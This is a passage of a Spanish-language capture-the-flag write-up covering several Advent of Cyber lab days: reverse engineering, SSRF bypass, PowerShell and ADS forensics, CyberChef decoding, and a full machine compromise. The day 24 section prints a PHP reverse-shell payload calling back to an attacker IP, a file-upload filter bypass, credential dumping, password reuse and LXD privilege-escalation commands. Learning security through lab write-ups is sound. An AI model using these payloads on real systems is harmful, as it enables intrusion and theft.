funcion main (; var int local_ch @ rbp-0xc) es por ello que hay que realizar un \u0026ldquo;paso siguiente\u0026rdquo; con el \u0026ldquo;comando\u0026rdquo; ds para obtener el valor de local_ch. Vemos que su valor es 0100.\nPara la segunda pregunta creamos un breakpoint en la direccion de memoria de la instruccion imul (db 0x00400b62).\n1  | 0x00400b62 0faf45f8 imul eax, dword [local_8h]   Nuevamente vemos el breakpoint, realizamos un \u0026ldquo;paso siguiente\u0026rdquo; (ds) y la lectura del valor de eax con el \u0026ldquo;comando\u0026rdquo; dr (valor de rax).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  [0x00400a30]\u0026gt; db 0x00400b62 [0x00400a30]\u0026gt; dc hit breakpoint at: 400b62 [0x00400b62]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | ;-- rip: | 0x00400b62 b 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\  0x00400b6f c3 ret [0x00400b62]\u0026gt; ds [0x00400b62]\u0026gt; dr rax = 0x00000006 rbx = 0x00400400 [ ... snip ... ] [0x00400b62]\u0026gt;   Para resolver la ultima pregunta debemos de crear un breakpoint en:\n1  | 0x00400b69 b800000000 mov eax, 0   Y obtener el valor de local_4h (rbp-0x4).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  [0x00400a30]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | 0x00400b69 b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\  0x00400b6f c3 ret [0x00400a30]\u0026gt; db 0x00400b69 [0x00400a30]\u0026gt; dc hit breakpoint at: 400b69 [0x00400b69]\u0026gt; pdf @main ;-- main: / (fcn) sym.main 35 | sym.main (); | ; var int local_ch @ rbp-0xc | ; var int local_8h @ rbp-0x8 | ; var int local_4h @ rbp-0x4 | ; DATA XREF from 0x00400a4d (entry0) | 0x00400b4d 55 push rbp | 0x00400b4e 4889e5 mov rbp, rsp | 0x00400b51 c745f4010000. mov dword [local_ch], 1 | 0x00400b58 c745f8060000. mov dword [local_8h], 6 | 0x00400b5f 8b45f4 mov eax, dword [local_ch] | 0x00400b62 0faf45f8 imul eax, dword [local_8h] | 0x00400b66 8945fc mov dword [local_4h], eax | ;-- rip: | 0x00400b69 b b800000000 mov eax, 0 | 0x00400b6e 5d pop rbp \\  0x00400b6f c3 ret [0x00400b69]\u0026gt; px @ rbp-0x4 - offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 0x7fff5ff5ce7c 0600 0000 4018 4000 0000 0000 e910 4000 ....@.@.......@. 0x7fff5ff5ce8c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5ce9c 0100 0000 a8cf f55f ff7f 0000 4d0b 4000 ......._....M.@. 0x7fff5ff5ceac 0000 0000 0000 0000 0000 0000 0600 0000 ................ 0x7fff5ff5cebc 5500 0000 5000 0000 0700 0000 0000 0000 U...P........... 0x7fff5ff5cecc 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cedc 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5ceec 0000 0000 0004 4000 0000 0000 f9c4 2eff ......@......... 0x7fff5ff5cefc 5fdd 6099 e018 4000 0000 0000 0000 0000 _.`...@......... 0x7fff5ff5cf0c 0000 0000 1890 6b00 0000 0000 0000 0000 ......k......... 0x7fff5ff5cf1c 0000 0000 f9c4 8e52 3462 9e66 f9c4 9aee .......R4b.f.... 0x7fff5ff5cf2c 5fdd 6099 0000 0000 0000 0000 0000 0000 _.`............. 0x7fff5ff5cf3c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf4c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf5c 0000 0000 0000 0000 0000 0000 0000 0000 ................ 0x7fff5ff5cf6c 0000 0000 0000 0000 0000 0000 0000 0000 ................ [0x00400b69]\u0026gt;   DAY 18 - Reverse Engineering Continuando con Ingenieria Inversa, esta vez con un archivo escrito en .NET, para su analisis utilizamos la herramienta que provee THM: ILSpy, en la maquina ofrecida en el reto del dia.\nAl ejecutar el archivo pregunta por una contraseña, y al ingresar un string cualquiera nos muestra un mensaje.\nUtilizando ILSpy para analizar el archivo vemos varias funciones de la aplicacion dentro del Formulario principal que manejan los diferentes componentes como botones, labels, textbox, etc., una de estas analiza que la contraseña ingresada sea a la misma que se encuentra en un \u0026ldquo;Array\u0026rdquo;. Tambien se logra ver los mensaje de cuando la contraseña es incorrecta y correcta.\nAl dirigirnos al \u0026ldquo;array\u0026rdquo; que contiene la contraseña, aunque no aparece en texto plano la informacion que se encuentra comentada (data(\u0026hellip;)) podria darnos el valor ya que el la aplicacion no logra obtener dicho valor.\nLa informacion esta en hexadecimal por lo que al decodificarlo vemos la contraseña. El valor final 00 se omite ya que hace referencia al final del \u0026ldquo;string\u0026rdquo;.\n1 2  73 61 6E 74 61 70 61 73 73 77 6F 72 64 33 32 31 santapassword321   Ingresamos la contraseña encontrada y vemos un mensaje junto con nuestra flag.\nDAY 19 - The Naughty or Nice List La descripcion del reto del dia indica que la aplicacion web es vulnerable a Server-Side Request Forgery (SSRF) y que al hacer bypass al filtro de hostname debemos utilizar localtest.me para que funcione. Al visitar la aplicacion vemos una caja de busqueda y tambien un formulario para ingresar credenciales.\nAl revisar el codigo fuente vemos que la caja de busqueda realiza la ejecucion de la funcion checkList().\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;div class=\u0026#34;col-lg-6 col-md-6 col-sm-12\u0026#34;\u0026gt; Welcome children!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; To find out if you are currently on the naughty list or the nice list, please enter your name below!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; Have a Merry Christmas! Ho ho ho!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; - Santa\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;form onsubmit=\u0026#34;checkList(); return false\u0026#34;\u0026gt; Name: \u0026lt;input name=\u0026#34;name\u0026#34; id=\u0026#34;name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Search\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function checkList() { window.location.replace(\u0026#34;/?proxy=\u0026#34; + encodeURIComponent(\u0026#34;http://list.hohoho:8080/search.php?name=\u0026#34; + encodeURIComponent(document.getElementById(\u0026#34;name\u0026#34;).value))); } \u0026lt;/script\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt;   La funcion realiza la codificacion de la direccion http://list.hohoho:8080/search.php?name= a URI junto con la codificacion (URI) del valor ingresado en la cajita que tiene como id el valor name, al finalizar esta codificacion creada se pasa como valor del parametro proxy en la pagina principal, de tal forma que quedaria de la siguiente forma si el valor a buscar fuera santa.com:\n1 2  window.location.replace(\u0026#34;/?proxy=\u0026#34; + encodeURIComponent(\u0026#34;http://list.hohoho:8080/search.php?name=\u0026#34; + encodeURIComponent(document.getElementById(\u0026#34;name\u0026#34;).value))); // /?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dsanta.com   Al realizar cualquier busqueda (ej. batman) este retorna el mensaje batman is on the Nice List., si se realiza una busqueda sin valor solo retorna is on the Nice List., dicha busqueda se pasa a una \u0026ldquo;pagina interna\u0026quot;: http://list.hohoho:8080 a la cual seguramente realiza una solicitud.\nSi enviamos el puerto incorrecto (ej. http%3A%2F%2Flist.hohoho%3A80%2Fsearch.php%3Fname%3Dbatman) este nos retorna el valor Failed to connect to list.hohoho port 80: Connection refused, si cambiamos el valor de la pagina list.hohoho a una IP retorna Your search has been blocked by our security team. lo que indica que la aplicacion verifica o filtra que el valor de \u0026ldquo;proxy\u0026rdquo; sea list.hohoho, de igual forma con algun otro dominio.\nComo sabemos la aplicacion es vulnerable a SSRF por lo que es posible realizar bypass al filtro de list.hohoho utilizando localtest.me agregando este ultimo a la direccion aceptada por la pagina: list.hohoho.localtest.me, existen otros valores que pueden ser reemplazados por localtest.me: lvh.me y vcap.me.\nAl realizar la solicitud a esta nueva direccion se muestra un nuevo mensaje en la pagina y contiene informacion para el panel que se encuentra en la pagina:\nAl ingresar con la contraseña y el usuario el cual tambien se define en el mensaje nos redirecciona a una nueva pagina, al pulsar el boton en esta nos muestra nuestra flag final.\n SSRF - POSTWIGGER  DAY 20 - PowershELlF to the rescue El reto del dia incluye utilizar PowerShell y encontrar archivos y strings dentro de estos, la informacion en la descripcion del reto es suficiente para resolver las tareas. Para la primera tarea nos ubicamos en la direccion de Documents y realizamos la busqueda de un archivo oculto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  PS C:\\Users\\mceager\u0026gt; Set-Location Documents\\  PS C:\\Users\\mceager\\Documents\u0026gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 12/7/2020 10:29 AM 402 desktop.ini -arh-- 11/18/2020 5:05 PM 35 e1fone.txt PS C:\\Users\\mceager\\Documents\u0026gt; Get-Content e1fone.txt All I want is my \u0026#39;2 front teeth\u0026#39;!!! PS C:\\Users\\mceager\\Documents\u0026gt;   Para la segunda tarea, realizamos de manera similar que la primera tarea pero en este caso buscamos un folder o directorio que especificamos con -Directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  PS C:\\Users\\mceager\u0026gt; Set-Location -Path Desktop\\ PS C:\\Users\\mceager\\Desktop\u0026gt; Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 12/7/2020 11:26 AM elf2wo PS C:\\Users\\mceager\\Desktop\u0026gt; Get-ChildItem -File -Path elf2wo\\ -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Desktop\\elf2wo Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/17/2020 10:26 AM 64 e70smsW10Y4k.txt PS C:\\Users\\mceager\\Desktop\u0026gt; Get-Content elf2wo\\e70smsW10Y4k.txt I want the movie Scrooged \u0026lt;3! PS C:\\Users\\mceager\\Desktop\u0026gt;   Para la tercera tarea nos pide que realicemos la busqueda de un directorio oculto en C:\\Windows, como sabemos este directorio contiene un centenar de archivos por lo que al realizar la busqueda de la misma manera que en la segunda tarea nos retornaria una gran cantidad de directorios, si nos fijamos en los archivos y directorios que encontramos contienen un numero representado por el numero de tarea en este caso seria el numero 3 el cual utilizamos para filtrar los archivos que solo contengan este numero.\n1 2 3 4 5 6 7 8 9 10  PS C:\\Windows\u0026gt; Get-ChildItem -Directory -Recurse -Filter \u0026#39;*3*\u0026#39; -Hidden -ErrorAction SilentlyContinue Directory: C:\\Windows\\System32 Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 11/23/2020 3:26 PM 3lfthr3e   En el directorio que encontramos obtenemos la lista de archivos ocultos y el numero de \u0026ldquo;palabras\u0026rdquo; que contiene el primero.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  PS C:\\Windows\u0026gt; Set-Location System32\\3lfthr3e PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Directory: C:\\Windows\\System32\\3lfthr3e Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 11/17/2020 10:58 AM 85887 1.txt -arh-- 11/23/2020 3:26 PM 12061168 2.txt PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 1.txt | Measure-Object -Word Lines Words Characters Property ----- ----- ---------- -------- 9999 PS C:\\Windows\\System32\\3lfthr3e\u0026gt;   Obtenemos las palabras segun el index indicado (551 y 6991):\n1 2 3 4 5  PS C:\\Windows\\System32\\3lfthr3e\u0026gt; (Get-Content -Path 1.txt)[551] Red PS C:\\Windows\\System32\\3lfthr3e\u0026gt; (Get-Content -Path 1.txt)[6991] Ryder PS C:\\Windows\\System32\\3lfthr3e\u0026gt;   En la ultima tarea debemos de buscar las dos palabras anteriores (Red Ryder) dentro del archivo 2.txt para ello utilizamos Select-String con -Pattern y con la ayuda de la pista dada.\n1 2 3 4 5 6 7  PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 2.txt | Select-String -pattern \u0026#34;Red Ryder\u0026#34; PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 2.txt | Select-String -Pattern \u0026#34;redryder\u0026#34; redryderbbgun PS C:\\Windows\\System32\\3lfthr3e\u0026gt;   DAY 21 - Time for some ELForensics En el reto del dia se presentan algunos ejecutables los cuales pueden ayudar a obtener informacion e identificar archivos, el objetivo es poder encontrar el conector de la base de datos oculto utilizando tecnicas forenses-investigativas.\n 1: Debemos de obtener el hash MD5 del archivo db.exe en el archivo de texto en Documents\\.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  PS C:\\Users\\littlehelper\\Documents\u0026gt; dir Directory: C:\\Users\\littlehelper\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/23/2020 11:21 AM 63 db file hash.txt -a---- 11/23/2020 11:22 AM 5632 deebee.exe PS C:\\Users\\littlehelper\\Documents\u0026gt; gc \u0026#34;db file hash.txt\u0026#34; Filename: db.exe MD5 Hash: 596690FFC54AB6101932856E6A78E3A1 PS C:\\Users\\littlehelper\\Documents\u0026gt;    2: obtener el hash MD5 del archivo ejecutable en Documents\\.\nWhat is the file hash of the mysterious executable within the Documents folder?  1 2 3 4 5 6 7 8  PS C:\\Users\\littlehelper\\Documents\u0026gt; Get-FileHash -Algorithm MD5 deebee.exe Algorithm Hash Path --------- ---- ---- MD5 5F037501FB542AD2D9B06EB12AED09F0 C:\\Users\\littlehelper\\Documents\\deebee.exe PS C:\\Users\\littlehelper\\Documents\u0026gt;    3: Utilizando strings debemos de encontrar la flag dentro del ejecutable anterior.  1 2 3 4 5 6  PS C:\\Users\\littlehelper\\Documents\u0026gt; c:\\Tools\\strings64.exe -accepteula deebee.exe | Select-String -pattern \u0026#34;{\u0026#34; THM{f6187e6cb[... snip ...]3e108cb6f9} PS C:\\Users\\littlehelper\\Documents\u0026gt;    4: La flag que se muestra al ejecutar el archivo anterior. Al ejecutar vemos una flag que desaparece rapidamente. Verificamos los Alternate Data Streams que mencionan y vemos que existe un stream llamado hidedb.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  PS C:\\Users\\littlehelper\\Documents\u0026gt; Get-Item -Path deebee.exe -Stream * PSPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe::$DATA PSParentPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents PSChildName : deebee.exe::$DATA PSDrive : C PSProvider : Microsoft.PowerShell.Core\\FileSystem PSIsContainer : False FileName : C:\\Users\\littlehelper\\Documents\\deebee.exe Stream : :$DATA Length : 5632 PSPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe:hidedb PSParentPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents PSChildName : deebee.exe:hidedb PSDrive : C PSProvider : Microsoft.PowerShell.Core\\FileSystem PSIsContainer : False FileName : C:\\Users\\littlehelper\\Documents\\deebee.exe Stream : hidedb Length : 6144 PS C:\\Users\\littlehelper\\Documents\u0026gt;   Ejecutamos el archivo (stream) oculto y nos muestra la flag que necesitabamos.\nDAY 22 - Elf McEager becomes CyberElf En el reto del dia presentan una serie de retos que consiste en decodificar cadenas de texto utilizando la herramienta CyberChef.\n  1: What is the password to the KeePass database?, encontramos una carpeta en el escritorio la cual tiene un nombre codificado en base64, utilizamos CyberChef para obtener decodificar el texto que es la contraseña de KeePass.\n  2: What is the encoding method listed as the \u0026lsquo;Matching ops\u0026rsquo;?, en la categoria principal Private encontramos una contraseña la cual ya esta en texto plano, al revisar el historial vemos otra la cual parece estar codificada. Utilizando Magic de CyberChef vemos el tipo de codificacion (el segundo) el cual sugiere Magic podriamos utilizar.\n  3: What is the decoded password value of the Elf Server?, en la categoria Networking encontramos una contraseña la cual esta codificada en Hexadecimal.\n  4: What is the decoded password value for ElfMail?, en la categoria eMail encontramos la contraseña que esta codificada en HTML entities.\n  5: Decode the last encoded value. What is the flag?, en la categoria Recycle Bin encontramos una contraseña en texto plano pero en la descripcion de esta encontramos codigo JavaScript que esta evaluando una cadena de caracteres en Unicode. Utilizamos From Charcode eliminando el codigo Javascript para obtener en texto plano lo que esta codificado, vemos que es codigo Javascript y dentro de este vemos tambien que hay caracteres Unicode.\n  Obtuvimos los valores reales de los valores unicode, lo que indica una URL y un \u0026ldquo;hash\u0026rdquo;(?), visitamos la URL con el \u0026ldquo;hash\u0026rdquo; y vemos nuestra flag.\nLa pista tambien nos indica que agreguemos dos veces From Charcode y nos devuelve: ............https://gist.github.com/heavenraiza/....................1d321244c4d667446dbfd9a3298a88b8...........\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  var somestring = document.createElement(\u0026#39;script\u0026#39;); somestring.type = \u0026#39;text/javascript\u0026#39;; somestring.async = true; somestring.src = String.fromCharCode(104, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 115, 116, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 104, 101, 97, 118, 101, 110, 114, 97, 105, 122, 97, 47); //smestring.src = hhttps://gist.github.com/heavenraiza/  var alls = document.getElementsByTagName(\u0026#39;script\u0026#39;); var nt3 = true; for (var i = alls.length; i--;) { //11d321244c4d667446dbfd9a3298a88b8  if (alls[i].src.indexOf(String.fromCharCode(49, 49, 100, 51, 50, 49, 50, 52, 52, 99, 52, 100, 54, 54, 55, 52, 52, 54, 100, 98, 102, 100, 57, 97, 51, 50, 57, 56, 97, 56, 56, 98, 56)) \u0026gt; -1) { nt3 = false; } } if (nt3 == true) { document.getElementsByTagName(\u0026#39;head\u0026#39;)[0].appendChild(somestring); }   DAY 23 - The Grinch strikes again! En la descripcion del dia realizan una explicacion sobre Ransomware, Volume Shadow Copy Service y Task Scheduler, y que este malware puede hacer uso de tareas programadas. Para las diferentes tareas se hace el uso de las herramientas VSS y Task Scheduler.\n Decrypt the fake \u0026lsquo;bitcoin address\u0026rsquo; within the ransom note. What is the plain text value?, en el escritorio encontramos una nota de \u0026ldquo;rescate\u0026rdquo; que esta \u0026ldquo;encriptada\u0026rdquo; pero es codificacion base64, la decodificamos y tenemos la \u0026ldquo;direccion\u0026rdquo; bitcoin.  1 2 3 4 5  #As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I\u0026#39;ll give you the key to decrypt. \u0026gt;:^p sckull@tars:~$ echo bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==|base64 -d nomorebestfestivalcompany sckull@tars:~$     At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?, en la carpeta Documents\\ y en la particion de Backup encontramos un archivo que parece estar encriptado y su extencion es .grinch.\n  What is the name of the suspicious scheduled task?, en Scheduler Task encontramos una tarea que ejecuta un ejecutable con un nombre extraño.\n  Inspect the properties of the scheduled task. What is the location of the executable that is run at login?, la direccion del ejecutable.\n  There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?, encontramos otra tarea que ejecuta el VSS con el nombre del ID de ShadowCopyVolume.\n  Assign the hidden partition a letter. What is the name of the hidden folder?, en la particion de Backup activamos la opcion de mostrar archivos ocultos para ver la carpeta oculta.\n  What is the password within the file?, en la carpeta que encontramos vemos Propiedades \u0026gt; Previous Version, abrimos la carpeta y archivo que contiene la contraseña.\n  DAY 24 - The Trial Before Christmas El ultimo dia presentan una descripcion de Burpsuite, MySQL, Cracking y Privilege Escalation LXD y una maquina la cual hay que obtener las respuestas a las tareas.\n What ports are open?: Realizamos un escaneo de puertos donde encontramos el puerto 80 y 65000 abiertos.  1 2 3 4 5 6 7 8 9 10  # Nmap 7.80 scan initiated Thu Dec 24 17:56:29 2020 as: nmap -p- --min-rate 1000 -o scanPorts 10.10.88.80 Warning: 10.10.88.80 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.88.80 (10.10.88.80) Host is up (0.34s latency). Not shown: 63777 closed ports, 1756 filtered ports PORT STATE SERVICE 80/tcp open http 65000/tcp open unknown # Nmap done at Thu Dec 24 17:59:31 2020 -- 1 IP address (1 host up) scanned in 182.67 seconds    What\u0026rsquo;s the title of the hidden website?: utilizamos wfuzz para realizar una busqueda de directorios/paginas recursiva, en la primera busqueda encontramos dos paginas, realizamos una segunda busqueda utilizando el directorio/pagina /3/ ya que /codes/ nos muestra solo un mensaje. Al finalizar encontramos una pagina en /3/9/9/2/3/6/4/ en el puerto 80. En el puerto 65000 encontramos un login con el titulo que buscamos.  1 2 3 4 5 6 7 8 9 10 11 12 13 14  #PUERTO 80 #wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 http://10.10.88.80/3/9/9/2/3/6/4/ /codes/ /3/ #PUERTO 650000 kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /api (Status: 301) /assets (Status: 301) /grid (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /uploads.php (Status: 200)     What is the name of the hidden php page?, con el escaneo con gobuster en el puerto 65000 encontramos la pagina, donde es posible subir archivos.\n  What is the name of the hidden directory where file uploads are saved?, segun el escaneo de gobuster encontramos el directorio/pagina /grid.\n  Bypass the filters. Upload and execute a reverse shell., intentamos subir una imagen en la pagina pero nos detecta que no es un tipo de archivo valido, analizando el codigo fuente vemos el codigo (filter.js, upload.js) donde se \u0026ldquo;filtran\u0026rdquo; los tipos de archivos png, jpeg, jpg pero al mismo tiempo estos tipos de archivos son los aceptados segun el codigo fuente de la pagina. Para hacer bypass utilizamos la configuracion de Burpusite descrita en el reto del dia, lo que ayudaria a que el filtro (filter.js) no \u0026ldquo;sea cargado\u0026rdquo; (opcion de Drop). Al realizar lo anterior si nos aceptaria los archivos y se mostrarían en /grid.\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //filter.js const filter = file =\u0026gt; { if([\u0026#34;image/png\u0026#34;, \u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;].indexOf(file.type) \u0026lt; 0){ return false; } else if ([\u0026#34;png\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;jpg\u0026#34;].indexOf(file.name.split(\u0026#34;.\u0026#34;).pop()) \u0026lt; 0){ return false; } //Let\u0026#39;s be honest -- these things are dangerous. May as well always return false Â¯\\_(ãƒ„)_/Â¯  return false; } //upload.js [... snip ... ] if(typeof filter === \u0026#34;function\u0026#34;){ if(!filter(file)){ changeMsg(\u0026#34;Invalid File Type\u0026#34;); return; } } [... snip ... ]   Subimos una imagen: batman.jpg.\nCreamos un archivo que ejecute nuestra shell inversa con el nombre y codigo shell.jpg.php:\n1 2 3 4  \u0026lt;?php system(\u0026#34;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.2.29.162\\\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\u0026#34;); ?\u0026gt;    What is the value of the web.txt flag?, con nuestra shell realizamos la busqueda del archivoweb.txt.  1 2 3 4 5 6 7  www-data@light-cycle:/var/www/TheGrid/public_html/grid$ find / -name web.txt 2\u0026gt;/dev/null \u0026lt;/public_html/grid$ find / -name web.txt 2\u0026gt;/dev/null /var/www/web.txt www-data@light-cycle:/var/www/TheGrid/public_html/grid$ cat /var/www/web.txt cat /var/www/web.txt THM{ENT[... snip ...]ID} www-data@light-cycle:/var/www/TheGrid/public_html/grid$     Upgrade and stabilize your shell., con nuestra shell y con la descripcion del reto actualizamos nuestra shell a una más comoda.\n  Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password, realizamos una enumeracion de archivos de la pagina que encontramos y vemos las credenciales para la base de datos.\n  1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php cat dbauth.php \u0026lt;?php $dbaddr = \u0026#34;localhost\u0026#34;; $dbuser = \u0026#34;t[... snip ...]on\u0026#34;; $dbpass = \u0026#34;IFight[... snip ...]Users\u0026#34;; $database = \u0026#34;tron\u0026#34;; $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database); if($dbh-\u0026gt;connect_error){ die($dbh-\u0026gt;connect_error); } ?\u0026gt;    Access the database and discover the encrypted credentials. What is the name of the database you find these in?, utilizando las credenciales ingresamos a la base de datos donde vemos las credenciales encriptadas.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p [... snip ...] mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | tron | +--------------------+ 2 rows in set (0.09 sec) mysql\u0026gt; use tron; show tables; use tron; Database changed mysql\u0026gt; show tables; +----------------+ | Tables_in_tron | +----------------+ | users | +----------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; select * from users; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | flynn | edc628f6[... snip ...]683f5e3ff7 | +----+----------+----------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt;     Crack the password. What is it?, utilizando CrackStation obtenemos en texto plano el hash que encontramos en la base de datos.\n  Use su to login to the newly discovered user by exploiting password reuse. - What is the value of the user.txt flag?, utilizamos la contraseña y usuario en la maquina para cambiar de usuario y obtener la flag user.txt.\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  www-data@light-cycle:/var/www/TheGrid/includes$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash [... snip ...] pollinate:x:111:1::/var/cache/pollinate:/bin/false flynn:x:1000:1000:flynn,,,:/home/flynn:/bin/bash www-data@light-cycle:/var/www/TheGrid/includes$ su flynn su flynn Password: @co[... snip ...]er@ flynn@light-cycle:/var/www/TheGrid/includes$ cd cd flynn@light-cycle:~$ ls -lah ls -lah total 32K drwxr-xr-x 4 flynn flynn 4.0K Dec 19 16:42 . drwxr-xr-x 3 root root 4.0K Dec 18 14:08 .. lrwxrwxrwx 1 root root 9 Dec 18 17:44 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 flynn flynn 220 Dec 18 14:08 .bash_logout -rw-r--r-- 1 flynn flynn 3.7K Dec 18 14:08 .bashrc drwx------ 2 flynn flynn 4.0K Dec 18 14:10 .cache drwx------ 3 flynn flynn 4.0K Dec 18 14:10 .gnupg -rw-r--r-- 1 flynn flynn 807 Dec 18 14:08 .profile -rw-r--r-- 1 flynn flynn 0 Dec 18 14:10 .sudo_as_admin_successful -r-------- 1 flynn flynn 30 Dec 19 16:42 user.txt flynn@light-cycle:~$ cat user.txt cat user.txt THM{IDEN[... snip ...]NISED} flynn@light-cycle:~$    Check the user\u0026rsquo;s groups. Which group can be leveraged to escalate privileges?, vemos los grupos a los que el usuario actual pertence.  1 2 3 4 5 6 7  flynn@light-cycle:~$ id id uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd) flynn@light-cycle:~$ groups groups flynn lxd flynn@light-cycle:~$    Abuse this group to escalate privileges to root., utilizamos la misma forma para escalar privilegios con lxd como en las maquinas de htb y thm.  1 2 3 4 5 6 7 8 9 10 11 12 13  #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #GAMINSERVER MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root 